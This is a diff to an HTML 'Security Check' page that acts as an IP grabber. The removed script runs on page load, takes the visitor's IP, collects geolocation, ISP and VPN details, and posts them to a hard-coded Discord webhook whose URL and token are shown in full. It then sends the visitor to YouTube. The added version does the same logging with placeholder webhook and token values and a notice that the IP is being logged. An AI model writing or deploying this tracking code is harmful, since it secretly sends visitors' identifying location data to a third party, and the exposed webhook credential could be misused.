@@ -3,63 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check.</title>
-    <script>
-        function sendWebhookAndRedirect() {
-            const webhookUrl = "https://discord.com/api/webhooks/1306930385837494284/frvIuZbW2lh_t01AuGTbwXBmk1saYYg5aZqUurx3U7uLYZpbMAZlxt3wWMoHvZM4b4rS";
-            const ip = "<?php echo isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']; ?>";
-            const browser = navigator.userAgent;
-
-            // Avoid bots, crawlers or invalid users
-            if (/bot|Discord|robot|curl|spider|crawler|^$/i.test(browser)) {
-                return;
-            }
-
-            const date = new Date();
-            const userDate = date.toLocaleDateString();
-            const userTime = date.toLocaleTimeString();
-
-            // Make the API calls
-            fetch(`http://ip-api.com/json/${ip}`)
-                .then(response => response.json())
-                .then(details => {
-                    return fetch(`https://json.geoiplookup.io/${ip}`)
-                        .then(response => response.json())
-                        .then(vpnCon => {
-                            const vpn = vpnCon.connection_type === "Corporate" ? 
-                                `Yes (Double Check: ${details.isp})` : 
-                                `No (Double Check: ${details.isp})`;
-
-                            const flag = `https://www.countryflags.io/${details.countryCode}/shiny/64.png`;
-                            const data = {
-                                content: `**User IP:** ${ip}\n**ISP:** ${details.isp}\n**Date:** ${userDate}\n**Time:** ${userTime}\n**Location:** ${details.city}\n**Region:** ${details.region}\n**Country:** ${details.country}\n**Postal Code:** ${details.zip}\n**IsVPN?** ${vpn} (Possible False-Positives)`,
-                                username: `Visitor Visited From: ${details.country}`,
-                                avatar_url: flag
-                            };
-
-                            const jsonData = JSON.stringify(data);
-
-                            // Send the webhook request
-                            fetch(webhookUrl, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: jsonData
-                            }).then(() => {
-                                // Redirect to YouTube after webhook completion
-                                window.location.href = "https://www.youtube.com";
-                            });
-                        });
-                });
+    <title>Siquiriity Chicks >:)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
         }
-        
-        // Call the function when the page loads
-        window.onload = sendWebhookAndRedirect;
-    </script>
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+    </style>
 </head>
 <body>
-    <h1>Redirecting.</h1>
-    <p>Overloaded</p>
+    <div class="container">
+        <h1>Redirecting</h1>
+        <p>Your IP and browser information is being logged. You will be redirected shortly.</p>
+    </div>
+
+    <script>
+        // Immediately fetch IP address and browser info upon page load
+        window.onload = function () {
+            fetch('https://ipinfo.io/json?token=YOUR_TOKEN') // Replace 'YOUR_TOKEN' with your ipinfo.io token
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip; // User's IP
+                    const browserInfo = navigator.userAgent; // Browser info from user agent
+
+                    // Prepare message for Discord webhook
+                    const message = {
+                        content: `New log received:\n\n**IP Address**: ${userIp}\n**Browser**: ${browserInfo}`,
+                    };
+
+                    // Send data to Discord webhook
+                    fetch('YOUR_DISCORD_WEBHOOK_URL', { // Replace with your actual Discord webhook URL
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        console.log('Data sent successfully to Discord:', result);
+                    })
+                    .catch(error => {
+                        console.error('Error sending data to Discord:', error);
+                    });
+
+                    // Redirect to YouTube after logging
+                    setTimeout(function() {
+                        window.location.href = 'https://www.youtube.com'; // Redirecting to YouTube
+                    }, 2000); // Redirect after 2 seconds to allow logging
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                });
+        };
+    </script>
 </body>
 </html>
